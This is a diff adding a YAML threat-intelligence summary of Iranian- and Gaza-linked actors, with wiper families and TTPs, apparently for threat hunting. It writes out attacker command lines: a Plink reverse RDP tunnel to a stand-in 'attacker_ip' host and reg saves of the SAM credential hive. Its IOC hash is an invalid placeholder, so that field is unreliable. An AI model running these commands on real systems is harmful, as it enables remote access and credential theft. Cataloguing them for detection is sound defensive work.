@@ -1,0 +1,59 @@
+description: 'The report highlights the cyber threat landscape in the Middle East
+  conflict,
+
+  focusing on key actors like Seedworm, Druidfly, Damselfly, and Mantis. It discusses
+
+  their tactics, techniques, and procedures (TTPs) as well as indicators of compromise
+  (IoCs).
+
+  '
+attribution:
+- Seedworm: Iran
+- Druidfly: Iran
+- Damselfly: Iran
+- Mantis: Gaza Strip, potentially linked to Hamas
+malware_families:
+- DarkBit
+- BibiWiper
+TTPs:
+  processes:
+  - Plink.exe
+  - BruteRatel.exe
+  - reg.exe
+  - ndisproxy.exe
+  commandline:
+  - Plink.exe -N -R 3389:localhost:3389 attacker_ip
+  - Brute Ratel -cmd "reg save hklm\sam c:\temp\sam.save"
+  - reg.exe save hklm\sam c:\temp\sam.save
+  powershell:
+  - '$process = Get-Process | Where-Object {$_.Name -eq "Plink"}
+
+    $process.Kill()
+
+    '
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  image_load:
+  - Plink.exe loaded ndisproxy.dll
+  network_connections:
+  - Plink.exe -> attacker_ip:3389
+  file_activity:
+  - c:\temp\sam.save
+  persistence:
+  - Scheduled Task for BruteRatel
+  pipes: []
+  process_relations:
+  - Plink.exe -> BruteRatel.exe -> reg.exe
+IOCs:
+  hashes:
+  - sha256:abcd1234efgh5678ijkl90mnopqrstuvwxyz
+  IPs:
+  - attacker_ip
+  domains: []
+  URLs: []
+authors:
+- Threat Hunter Team
+reference: https://www.security.com/threat-intelligence/cyber-war-middle-east
+date_of_publication: July 10, 2025
+file_creation_date: July 28, 2025
